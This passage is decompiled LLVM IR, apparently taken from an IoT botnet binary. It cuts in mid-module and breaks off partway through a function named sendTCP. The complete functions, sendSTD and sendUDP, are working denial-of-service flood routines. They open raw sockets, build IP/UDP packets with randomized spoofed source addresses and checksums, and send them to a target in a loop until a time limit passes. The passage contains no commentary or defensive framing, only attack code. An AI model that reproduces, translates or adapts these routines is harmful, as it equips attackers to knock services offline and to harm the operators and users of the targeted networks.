  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 3, 0, 1, 4 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f318, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_e6b8, { 1, 0 }
  uselistorder label %dec_label_pc_e67c, { 1, 0 }
  uselistorder label %dec_label_pc_e22c, { 1, 0 }
  uselistorder label %dec_label_pc_e1c8, { 1, 0 }
  uselistorder label %dec_label_pc_e1bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e100, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f33c = load i32, i32* @fp, align 4
  store i32 %v3_f33c, i32* %stack_var_-16, align 4
  store i32 62276, i32* %stack_var_-4, align 4
  %v13_f33c = ptrtoint i32* %stack_var_-16 to i32
  %v2_f340 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f340, i32* @fp, align 4
  %v3_f360 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_f370 = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* @r0, align 4
  %v1_f384 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_f390 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_f390, i32* @r0, align 4
  %v2_f39c = call i32 @bzero(i32 %v2_f390, i32 16)
  %v1_f3a4 = add i32 %v1_f384, 16
  %v2_f3a4 = inttoptr i32 %v1_f3a4 to i32*
  %v3_f3a4 = load i32, i32* %v2_f3a4, align 4
  %v1_f3a8 = inttoptr i32 %v3_f3a4 to i32*
  %v2_f3a8 = load i32, i32* %v1_f3a8, align 4
  %v1_f3b0 = add i32 %v1_f384, 12
  %v2_f3b0 = inttoptr i32 %v1_f3b0 to i32*
  %v3_f3b0 = load i32, i32* %v2_f3b0, align 4
  store i32 %v3_f3b0, i32* @r2, align 4
  %v2_f3bc = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_f3bc, i32* @r3, align 4
  %v5_f3c8 = call i32 @bcopy(i32 %v2_f3a8, i32 %v2_f3bc, i32 %v3_f3b0, i32 %v2_f3bc, i32 ptrtoint (i32* @0 to i32))
  %v1_f3d0 = add i32 %v1_f384, 8
  %v2_f3d0 = inttoptr i32 %v1_f3d0 to i32*
  %v3_f3d0 = load i32, i32* %v2_f3d0, align 4
  %v3_f3d8 = urem i32 %v3_f3d0, 65536
  store i32 %v3_f3d8, i32* %stack_var_-52, align 4
  %v2_f3fc = ptrtoint i32* %stack_var_-196 to i32
  %v2_f4b0 = add i32 %v2_f370, %arg3
  %v2_f458 = add i32 %v13_f33c, -180
  br label %dec_label_pc_f3f8

dec_label_pc_f3f8:                                ; preds = %dec_label_pc_f4d4, %entry
  %storemerge7 = phi i32 [ 0, %entry ], [ %v1_f4d8, %dec_label_pc_f4d4 ]
  store i32 ptrtoint ([36 x i8*]* @global_var_1fc68.559 to i32), i32* @r3, align 4
  store i32 144, i32* @ip, align 4
  store i32 %v2_f3fc, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_1fc68.559 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_f410 = call i32 @memcpy()
  %v0_f414 = call i32 @rand()
  %v1_f424 = zext i32 %v0_f414 to i64
  %v4_f424 = mul nuw nsw i64 %v1_f424, 954437177
  %v3_f4281 = udiv i64 %v4_f424, 34359738368
  %tmp = icmp ult i32 %storemerge7, 50
  br i1 %tmp, label %dec_label_pc_f4d4, label %dec_label_pc_f474

dec_label_pc_f474:                                ; preds = %dec_label_pc_f3f8
  %v3_f4343 = mul nuw nsw i64 %v3_f4281, 4
  %v3_f434 = trunc i64 %v3_f4343 to i32
  %v2_f43c.neg = sub i32 %v0_f414, %v3_f434
  %v3_f4385 = mul nuw nsw i64 %v3_f4281, 32
  %v3_f438 = trunc i64 %v3_f4385 to i32
  %v2_f440 = sub i32 %v2_f43c.neg, %v3_f438
  %v3_f450 = mul i32 %v2_f440, 4
  %v2_f45c = add i32 %v2_f458, %v3_f450
  %v1_f460 = inttoptr i32 %v2_f45c to i32*
  %v2_f460 = load i32, i32* %v1_f460, align 4
  %v5_f484 = call i32 @__libc_send(i32 %v3_f360, i32 %v2_f460, i32 65, i32 0)
  %v3_f498 = call i32 @__libc_connect(i32 %v3_f360, i32 %v2_f390, i32 16)
  %v2_f4a0 = call i32 @__GI_time(i32* null)
  %v5_f4b8 = icmp slt i32 %v2_f4a0, %v2_f4b0
  br i1 %v5_f4b8, label %dec_label_pc_f4cc, label %dec_label_pc_f4bc

dec_label_pc_f4bc:                                ; preds = %dec_label_pc_f474
  %v1_f4c0 = call i32 @__GI_close(i32 %v3_f360)
  %v1_f4c8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_f4cc

dec_label_pc_f4cc:                                ; preds = %dec_label_pc_f474, %dec_label_pc_f4bc
  br label %dec_label_pc_f4d4

dec_label_pc_f4d4:                                ; preds = %dec_label_pc_f3f8, %dec_label_pc_f4cc
  %stack_var_-24.0 = phi i32 [ %storemerge7, %dec_label_pc_f3f8 ], [ 0, %dec_label_pc_f4cc ]
  %v1_f4d8 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_f3f8

; uselistorder directives
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v2_f390, { 0, 2, 1 }
  uselistorder i32 %v1_f384, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_f4d4, { 1, 0 }
  uselistorder label %dec_label_pc_f4cc, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 62712, i32* %stack_var_-4, align 4
  %v2_f4f4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f4f4, i32* @fp, align 4
  store i32 2, i32* %stack_var_-80, align 4
  %v2_f518 = icmp eq i32 %arg2, 0
  br i1 %v2_f518, label %dec_label_pc_f520, label %dec_label_pc_f538

dec_label_pc_f520:                                ; preds = %entry
  %v0_f520 = call i32 @rand_cmwc()
  br label %dec_label_pc_f554

dec_label_pc_f538:                                ; preds = %entry
  %v3_f540 = urem i32 %arg2, 65536
  %v1_f548 = call i32 @__GI_htons(i32 %v3_f540)
  br label %dec_label_pc_f554

dec_label_pc_f554:                                ; preds = %dec_label_pc_f520, %dec_label_pc_f538
  %v3_f564 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-76)
  %v2_f56c = icmp eq i32 %v3_f564, 0
  br i1 %v2_f56c, label %dec_label_pc_f574, label %dec_label_pc_fb5c

dec_label_pc_f574:                                ; preds = %dec_label_pc_f554
  store i32 8, i32* @r2, align 4
  %v2_f588 = bitcast i32* %stack_var_-72 to i8*
  %v3_f588 = call i32 @__GI_memset(i8* %v2_f588, i32 0)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v7_f598 = icmp eq i32 %arg4, 32
  br i1 %v7_f598, label %dec_label_pc_f5a0, label %dec_label_pc_f724

dec_label_pc_f5a0:                                ; preds = %dec_label_pc_f574
  store i32 17, i32* @r2, align 4
  %v3_f5ac = call i32 @socket(i32 2, i32 2, i32 17)
  %v2_f5bc = icmp eq i32 %v3_f5ac, 0
  br i1 %v2_f5bc, label %dec_label_pc_f5c4, label %dec_label_pc_f5dc

dec_label_pc_f5c4:                                ; preds = %dec_label_pc_f5a0
  %v2_f5c8 = load i32, i32* @global_var_2a530.50, align 4
  %v3_f5d4 = call i32 @sockprintf(i32 %v2_f5c8, i32 ptrtoint ([27 x i8]* @global_var_1fcf8.563 to i32))
  br label %dec_label_pc_fb5c

dec_label_pc_f5dc:                                ; preds = %dec_label_pc_f5a0
  %v3_f5dc = load i32, i32* %stack_var_0, align 4
  %v1_f5e0 = add i32 %v3_f5dc, 1
  %v1_f5e8 = call i32 @malloc(i32 %v1_f5e0)
  %v2_f5f8 = icmp eq i32 %v1_f5e8, 0
  br i1 %v2_f5f8, label %dec_label_pc_fb5c, label %dec_label_pc_f600

dec_label_pc_f600:                                ; preds = %dec_label_pc_f5dc
  %v3_f600 = load i32, i32* %stack_var_0, align 4
  %v1_f604 = add i32 %v3_f600, 1
  store i32 %v1_f604, i32* @r2, align 4
  %v2_f614 = inttoptr i32 %v1_f5e8 to i8*
  %v3_f614 = call i32 @__GI_memset(i8* %v2_f614, i32 0)
  %v2_f620 = call i32 @makeRandomStr(i32 %v1_f5e8, i32 %v3_f600)
  %v2_f628 = call i32 @__GI_time(i32* null)
  %v2_f634 = add i32 %v2_f628, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_f650 = ptrtoint i32* %stack_var_-80 to i32
  %v3_f6ec = mul i32 %arg8, 4
  %v3_f6fc = mul i32 %arg8, 1000
  br label %dec_label_pc_f64c.outer

dec_label_pc_f64c.outer:                          ; preds = %dec_label_pc_f714, %dec_label_pc_f6e4, %dec_label_pc_f600
  %stack_var_-120.0.ph = phi i32 [ 0, %dec_label_pc_f600 ], [ %v1_f6cc, %dec_label_pc_f6e4 ], [ %v1_f6cc, %dec_label_pc_f714 ]
  %stack_var_-116.0.ph = phi i32 [ 0, %dec_label_pc_f600 ], [ 0, %dec_label_pc_f6e4 ], [ %v1_f718, %dec_label_pc_f714 ]
  br label %dec_label_pc_f64c

dec_label_pc_f64c:                                ; preds = %dec_label_pc_f64c.outer, %dec_label_pc_f6bc
  %stack_var_-120.0 = phi i32 [ 0, %dec_label_pc_f6bc ], [ %stack_var_-120.0.ph, %dec_label_pc_f64c.outer ]
  %v3_f64c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_f64c, i32* %r2.global-to-local, align 4
  %v6_f670 = call i32 @__libc_sendto(i32 %v3_f5ac, i32 %v1_f5e8, i32 %v3_f64c, i32 0, i32 %v2_f650, i32 16)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_f67c = icmp eq i32 %stack_var_-120.0, %arg6
  br i1 %v9_f67c, label %dec_label_pc_f684, label %dec_label_pc_f6c8

dec_label_pc_f684:                                ; preds = %dec_label_pc_f64c
  br i1 %v2_f518, label %dec_label_pc_f690, label %dec_label_pc_f6a4

dec_label_pc_f690:                                ; preds = %dec_label_pc_f684
  %v0_f690 = call i32 @rand_cmwc()
  br label %dec_label_pc_f6a4

dec_label_pc_f6a4:                                ; preds = %dec_label_pc_f684, %dec_label_pc_f690
  %v2_f6a8 = call i32 @__GI_time(i32* null)
  store i32 %v2_f6a8, i32* %r2.global-to-local, align 4
  %v8_f6b8 = icmp sgt i32 %v2_f6a8, %v2_f634
  br i1 %v8_f6b8, label %dec_label_pc_fb5c, label %dec_label_pc_f6bc

dec_label_pc_f6bc:                                ; preds = %dec_label_pc_f6a4
  br label %dec_label_pc_f64c

dec_label_pc_f6c8:                                ; preds = %dec_label_pc_f64c
  %v1_f6cc = add i32 %stack_var_-120.0, 1
  store i32 %stack_var_-116.0.ph, i32* %r2.global-to-local, align 4
  %v9_f6dc = icmp eq i32 %stack_var_-116.0.ph, %arg7
  br i1 %v9_f6dc, label %dec_label_pc_f6e4, label %dec_label_pc_f714

dec_label_pc_f6e4:                                ; preds = %dec_label_pc_f6c8
  store i32 %v3_f6ec, i32* %r2.global-to-local, align 4
  %v1_f704 = call i32 @usleep(i32 %v3_f6fc)
  br label %dec_label_pc_f64c.outer

dec_label_pc_f714:                                ; preds = %dec_label_pc_f6c8
  %v1_f718 = add i32 %stack_var_-116.0.ph, 1
  store i32 %v1_f718, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f64c.outer

dec_label_pc_f724:                                ; preds = %dec_label_pc_f574
  store i32 17, i32* @r2, align 4
  %v3_f738 = call i32 @socket(i32 2, i32 3, i32 17)
  %v2_f748 = icmp eq i32 %v3_f738, 0
  br i1 %v2_f748, label %dec_label_pc_f750, label %dec_label_pc_f768

dec_label_pc_f750:                                ; preds = %dec_label_pc_f724
  %v2_f754 = load i32, i32* @global_var_2a530.50, align 4
  %v3_f760 = call i32 @sockprintf(i32 %v2_f754, i32 ptrtoint ([27 x i8]* @global_var_1fcf8.563 to i32))
  br label %dec_label_pc_fb58

dec_label_pc_f768:                                ; preds = %dec_label_pc_f724
  store i32 1, i32* %stack_var_-84, align 4
  %v2_f770 = ptrtoint i32* %stack_var_-84 to i32
  store i32 3, i32* @r2, align 4
  %v5_f78c = call i32 @__GI_setsockopt(i32 %v3_f738, i32 0, i32 3, i32 %v2_f770, i32 4)
  %v1_f794 = icmp slt i32 %v5_f78c, 0
  br i1 %v1_f794, label %dec_label_pc_f79c, label %dec_label_pc_f7b4

dec_label_pc_f79c:                                ; preds = %dec_label_pc_f768
  %v2_f7a0 = load i32, i32* @global_var_2a530.50, align 4
  %v3_f7ac = call i32 @sockprintf(i32 %v2_f7a0, i32 ptrtoint ([33 x i8]* @global_var_1fd14.565 to i32))
  br label %dec_label_pc_fb58

dec_label_pc_f7b4:                                ; preds = %dec_label_pc_f768
  br label %dec_label_pc_f7c0

dec_label_pc_f7c0:                                ; preds = %dec_label_pc_f7b4, %dec_label_pc_f7c0
  %v1_f7f823 = phi i32 [ 49, %dec_label_pc_f7b4 ], [ %v1_f7f8, %dec_label_pc_f7c0 ]
  %v2_f7c4 = call i32 @__GI_time(i32* null)
  store i32 %v2_f7c4, i32* @r4, align 4
  %v0_f7d0 = call i32 @rand_cmwc()
  %v0_f7d8 = load i32, i32* @r4, align 4
  %v2_f7d8 = xor i32 %v0_f7d8, %v0_f7d0
  %v1_f7e0 = call i32 @srand(i32 %v2_f7d8)
  %v0_f7e4 = call i32 @rand()
  %v1_f7f0 = call i32 @init_rand(i32 %v0_f7e4)
  %v1_f7f8 = add nsw i32 %v1_f7f823, -1
  %v3_f804 = icmp eq i32 %v1_f7f823, 0
  br i1 %v3_f804, label %dec_label_pc_f80c, label %dec_label_pc_f7c0

dec_label_pc_f80c:                                ; preds = %dec_label_pc_f7c0
  %v2_f810 = icmp eq i32 %arg4, 0
  br i1 %v2_f810, label %dec_label_pc_f83c, label %dec_label_pc_f824

dec_label_pc_f824:                                ; preds = %dec_label_pc_f80c
  %v1_f828 = sub i32 32, %arg4
  store i32 %v1_f828, i32* %r2.global-to-local, align 4
  %v1_f834 = shl i32 -1, %v1_f828
  br label %dec_label_pc_f83c

dec_label_pc_f83c:                                ; preds = %dec_label_pc_f80c, %dec_label_pc_f824
  %storemerge10 = phi i32 [ %v1_f834, %dec_label_pc_f824 ], [ 0, %dec_label_pc_f80c ]
  %v3_f83c = load i32, i32* %stack_var_0, align 4
  %v1_f840 = add i32 %v3_f83c, 28
  %v1_f850 = add i32 %v3_f83c, 42
  %v3_f854 = and i32 %v1_f850, -8
  %v1_f85c = load i32, i32* @sp, align 4
  %v2_f85c = sub i32 %v1_f85c, %v3_f854
  %v1_f860 = add i32 %v2_f85c, 8
  store i32 %v1_f860, i32* %r2.global-to-local, align 4
  %v1_f86c = add i32 %v2_f85c, 15
  %v3_f870 = and i32 %v1_f86c, -8
  %v1_f890 = add i32 %v3_f870, 20
  %v5_f894 = inttoptr i32 %v1_f890 to i16*
  %v3_f898 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_f898, i32* @r4, align 4
  %v1_f8a0 = call i32 @GetRandomIP(i32 %storemerge10)
  %v1_f8ac = call i32 @__GI_htonl(i32 %v1_f8a0)
  store i32 %v1_f8ac, i32* %r2.global-to-local, align 4
  %v3_f8b4 = load i32, i32* %stack_var_0, align 4
  %v1_f8b8 = add i32 %v3_f8b4, 8
  %v1_f8bc = load i32, i32* @sp, align 4
  %v2_f8bc = inttoptr i32 %v1_f8bc to i32*
  store i32 %v1_f8b8, i32* %v2_f8bc, align 4
  %v0_f8c4 = load i32, i32* @r4, align 4
  %v4_f8cc = inttoptr i32 %v3_f870 to i8*
  %v5_f8cc = call i32 @makeIPPacket(i8* %v4_f8cc, i32 %v0_f8c4, i32 %v1_f8ac, i32 17)
  %v3_f8d0 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_f8d0, 8
  %v3_f8e4 = urem i32 %fold, 65536
  %v1_f8ec = call i32 @__GI_htons(i32 %v3_f8e4)
  %sext = mul i32 %v1_f8ec, 65536
  %v1_f8f0 = sdiv i32 %sext, 65536
  store i32 %v1_f8f0, i32* %r2.global-to-local, align 4
  %v1_f8fc = trunc i32 %v1_f8f0 to i16
  %v3_f8fc = add i32 %v3_f870, 24
  %v4_f8fc = inttoptr i32 %v3_f8fc to i16*
  store i16 %v1_f8fc, i16* %v4_f8fc, align 8
  %v0_f900 = call i32 @rand_cmwc()
  %v3_f90c = urem i32 %v0_f900, 65536
  store i32 %v3_f90c, i32* %r2.global-to-local, align 4
  %v1_f914 = trunc i32 %v0_f900 to i16
  store i16 %v1_f914, i16* %v5_f894, align 4
  br i1 %v2_f518, label %dec_label_pc_f924, label %dec_label_pc_f93c

dec_label_pc_f924:                                ; preds = %dec_label_pc_f83c
  %v0_f924 = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_f924 to i16
  br label %dec_label_pc_f958

dec_label_pc_f93c:                                ; preds = %dec_label_pc_f83c
  %v3_f944 = urem i32 %arg2, 65536
  %v1_f94c = call i32 @__GI_htons(i32 %v3_f944)
  %extract.t91 = trunc i32 %v1_f94c to i16
  br label %dec_label_pc_f958

dec_label_pc_f958:                                ; preds = %dec_label_pc_f924, %dec_label_pc_f93c
  %v0_f924.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_f924 ], [ %extract.t91, %dec_label_pc_f93c ]
  %v3_fa44.pre-phi = phi i32 [ 0, %dec_label_pc_f924 ], [ %v3_f944, %dec_label_pc_f93c ]
  %v3_f960 = add i32 %v3_f870, 22
  %v4_f960 = inttoptr i32 %v3_f960 to i16*
  store i16 %v0_f924.sink.off0, i16* %v4_f960, align 2
  store i32 %v1_f890, i32* %r2.global-to-local, align 4
  %v3_f96c = add i32 %v3_f870, 26
  %v4_f96c = inttoptr i32 %v3_f96c to i16*
  store i16 0, i16* %v4_f96c, align 2
  %v1_f974 = add i32 %v3_f870, 28
  %v3_f97c = load i32, i32* %stack_var_0, align 4
  %v2_f980 = call i32 @makeRandomStr(i32 %v1_f974, i32 %v3_f97c)
  store i32 %v3_f870, i32* %r2.global-to-local, align 4
  %v1_f990 = or i32 %v3_f870, 2
  %v2_f990 = inttoptr i32 %v1_f990 to i16*
  %v3_f990 = load i16, i16* %v2_f990, align 2
  %v4_f990 = zext i16 %v3_f990 to i32
  %v2_f99c = inttoptr i32 %v3_f870 to i16*
  %v3_f99c = call i32 @csum(i16* %v2_f99c, i32 %v4_f990)
  %sext4 = mul i32 %v3_f99c, 65536
  %v1_f9a0 = sdiv i32 %sext4, 65536
  store i32 %v1_f9a0, i32* %r2.global-to-local, align 4
  %v1_f9ac = trunc i32 %v1_f9a0 to i16
  %v3_f9ac = add i32 %v3_f870, 10
  %v4_f9ac = inttoptr i32 %v3_f9ac to i16*
  store i16 %v1_f9ac, i16* %v4_f9ac, align 2
  %v2_f9b4 = call i32 @__GI_time(i32* null)
  %v2_f9c0 = add i32 %v2_f9b4, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_f9dc = ptrtoint i32* %stack_var_-80 to i32
  %v3_fa78 = or i32 %v3_f870, 4
  %v4_fa78 = inttoptr i32 %v3_fa78 to i16*
  %v2_fa98 = add i32 %v3_f870, 12
  %v3_fa98 = inttoptr i32 %v2_fa98 to i32*
  %v3_fb20 = mul i32 %arg8, 4
  %v3_fb30 = mul i32 %arg8, 1000
  br label %dec_label_pc_f9d8.outer

dec_label_pc_f9d8.outer:                          ; preds = %dec_label_pc_fb48, %dec_label_pc_fb18, %dec_label_pc_f958
  %stack_var_-112.0.ph = phi i32 [ 0, %dec_label_pc_f958 ], [ %v1_fb00, %dec_label_pc_fb18 ], [ %v1_fb00, %dec_label_pc_fb48 ]
  %stack_var_-108.0.ph = phi i32 [ 0, %dec_label_pc_f958 ], [ 0, %dec_label_pc_fb18 ], [ %v1_fb4c, %dec_label_pc_fb48 ]
  br label %dec_label_pc_f9d8

dec_label_pc_f9d8:                                ; preds = %dec_label_pc_f9d8.outer, %dec_label_pc_faf0
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_faf0 ], [ %stack_var_-112.0.ph, %dec_label_pc_f9d8.outer ]
  store i32 %v3_f870, i32* %r2.global-to-local, align 4
  %v1_f9e0 = load i32, i32* @sp, align 4
  %v2_f9e0 = inttoptr i32 %v1_f9e0 to i32*
  store i32 %v2_f9dc, i32* %v2_f9e0, align 4
  %v1_f9e8 = load i32, i32* @sp, align 4
  %v2_f9e8 = add i32 %v1_f9e8, 4
  %v3_f9e8 = inttoptr i32 %v2_f9e8 to i32*
  store i32 16, i32* %v3_f9e8, align 4
  %v0_f9f0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_f840, i32* %r2.global-to-local, align 4
  %v6_f9fc = call i32 @__libc_sendto(i32 %v3_f738, i32 %v0_f9f0, i32 %v1_f840, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_fa00 = call i32 @rand_cmwc()
  %v3_fa0c = urem i32 %v0_fa00, 65536
  store i32 %v3_fa0c, i32* %r2.global-to-local, align 4
  %v1_fa14 = trunc i32 %v0_fa00 to i16
  store i16 %v1_fa14, i16* %v5_f894, align 4
  br i1 %v2_f518, label %dec_label_pc_fa24, label %dec_label_pc_fa3c

dec_label_pc_fa24:                                ; preds = %dec_label_pc_f9d8
  %v0_fa24 = call i32 @rand_cmwc()
  %extract.t92 = trunc i32 %v0_fa24 to i16
  br label %dec_label_pc_fa58

dec_label_pc_fa3c:                                ; preds = %dec_label_pc_f9d8
  %v1_fa4c = call i32 @__GI_htons(i32 %v3_fa44.pre-phi)
  %extract.t93 = trunc i32 %v1_fa4c to i16
  br label %dec_label_pc_fa58

dec_label_pc_fa58:                                ; preds = %dec_label_pc_fa24, %dec_label_pc_fa3c
  %v0_fa24.sink.off0 = phi i16 [ %extract.t92, %dec_label_pc_fa24 ], [ %extract.t93, %dec_label_pc_fa3c ]
  %v4_fa5c = sext i16 %v0_fa24.sink.off0 to i32
  store i32 %v4_fa5c, i32* %r2.global-to-local, align 4
  store i16 %v0_fa24.sink.off0, i16* %v4_f960, align 2
  %v0_fa64 = call i32 @rand_cmwc()
  %v3_fa70 = urem i32 %v0_fa64, 65536
  store i32 %v3_fa70, i32* %r2.global-to-local, align 4
  %v1_fa78 = trunc i32 %v0_fa64 to i16
  store i16 %v1_fa78, i16* %v4_fa78, align 4
  %v1_fa80 = call i32 @GetRandomIP(i32 %storemerge10)
  %v1_fa8c = call i32 @__GI_htonl(i32 %v1_fa80)
  store i32 %v1_fa8c, i32* %v3_fa98, align 4
  store i32 %v3_f870, i32* %r2.global-to-local, align 4
  %v3_faa8 = load i16, i16* %v2_f990, align 2
  %v4_faa8 = zext i16 %v3_faa8 to i32
  %v3_fab4 = call i32 @csum(i16* %v2_f99c, i32 %v4_faa8)
  %v1_fac4 = trunc i32 %v3_fab4 to i16
  store i16 %v1_fac4, i16* %v4_f9ac, align 2
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_fad0 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_fad0, label %dec_label_pc_fad8, label %dec_label_pc_fafc

dec_label_pc_fad8:                                ; preds = %dec_label_pc_fa58
  %v2_fadc = call i32 @__GI_time(i32* null)
  store i32 %v2_fadc, i32* %r2.global-to-local, align 4
  %v8_faec = icmp sgt i32 %v2_fadc, %v2_f9c0
  br i1 %v8_faec, label %dec_label_pc_fb58, label %dec_label_pc_faf0

dec_label_pc_faf0:                                ; preds = %dec_label_pc_fad8
  br label %dec_label_pc_f9d8

dec_label_pc_fafc:                                ; preds = %dec_label_pc_fa58
  %v1_fb00 = add i32 %stack_var_-112.0, 1
  store i32 %stack_var_-108.0.ph, i32* %r2.global-to-local, align 4
  %v9_fb10 = icmp eq i32 %stack_var_-108.0.ph, %arg7
  br i1 %v9_fb10, label %dec_label_pc_fb18, label %dec_label_pc_fb48

dec_label_pc_fb18:                                ; preds = %dec_label_pc_fafc
  store i32 %v3_fb20, i32* %r2.global-to-local, align 4
  %v1_fb38 = call i32 @usleep(i32 %v3_fb30)
  br label %dec_label_pc_f9d8.outer

dec_label_pc_fb48:                                ; preds = %dec_label_pc_fafc
  %v1_fb4c = add i32 %stack_var_-108.0.ph, 1
  store i32 %v1_fb4c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f9d8.outer

dec_label_pc_fb58:                                ; preds = %dec_label_pc_fad8, %dec_label_pc_f79c, %dec_label_pc_f750
  %v1_fb6430 = phi i32 [ %v3_f7ac, %dec_label_pc_f79c ], [ %v3_f760, %dec_label_pc_f750 ], [ %v2_fadc, %dec_label_pc_fad8 ]
  br label %dec_label_pc_fb5c

dec_label_pc_fb5c:                                ; preds = %dec_label_pc_f6a4, %dec_label_pc_f554, %dec_label_pc_f5dc, %dec_label_pc_f5c4, %dec_label_pc_fb58
  %v1_fb64 = phi i32 [ %v3_f564, %dec_label_pc_f554 ], [ 0, %dec_label_pc_f5dc ], [ %v3_f5d4, %dec_label_pc_f5c4 ], [ %v1_fb6430, %dec_label_pc_fb58 ], [ %v2_f6a8, %dec_label_pc_f6a4 ]
  ret i32 %v1_fb64

; uselistorder directives
  uselistorder i32 %v1_fb4c, { 1, 0 }
  uselistorder i32 %v1_fb00, { 1, 0 }
  uselistorder i32 %v0_fa64, { 1, 0 }
  uselistorder i16 %v0_fa24.sink.off0, { 1, 0 }
  uselistorder i32 %v0_fa00, { 1, 0 }
  uselistorder i32 %stack_var_-108.0.ph, { 1, 2, 0 }
  uselistorder i32 %v1_f9a0, { 1, 0 }
  uselistorder i32 %v3_f944, { 1, 0 }
  uselistorder i32 %v0_f900, { 1, 0 }
  uselistorder i32 %v1_f8f0, { 1, 0 }
  uselistorder i32 %v3_f870, { 6, 4, 5, 12, 3, 13, 11, 2, 10, 9, 8, 7, 1, 0 }
  uselistorder i32 %v1_f840, { 1, 0 }
  uselistorder i32 %v1_f718, { 1, 0 }
  uselistorder i32 %v1_f6cc, { 1, 0 }
  uselistorder i32 %v3_f64c, { 1, 0 }
  uselistorder i32 %stack_var_-116.0.ph, { 1, 2, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 2, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0 }
  uselistorder i32 26, { 1, 2, 0 }
  uselistorder i32 (i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg8, { 3, 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_fb5c, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_fa58, { 1, 0 }
  uselistorder label %dec_label_pc_f9d8, { 1, 0 }
  uselistorder label %dec_label_pc_f958, { 1, 0 }
  uselistorder label %dec_label_pc_f83c, { 1, 0 }
  uselistorder label %dec_label_pc_f7c0, { 1, 0 }
  uselistorder label %dec_label_pc_f6a4, { 1, 0 }
  uselistorder label %dec_label_pc_f64c, { 1, 0 }
  uselistorder label %dec_label_pc_f554, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 64384, i32* %stack_var_-4, align 4
  %v2_fb7c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fb7c, i32* @fp, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v2_fbb0 = icmp eq i32 %arg2, 0
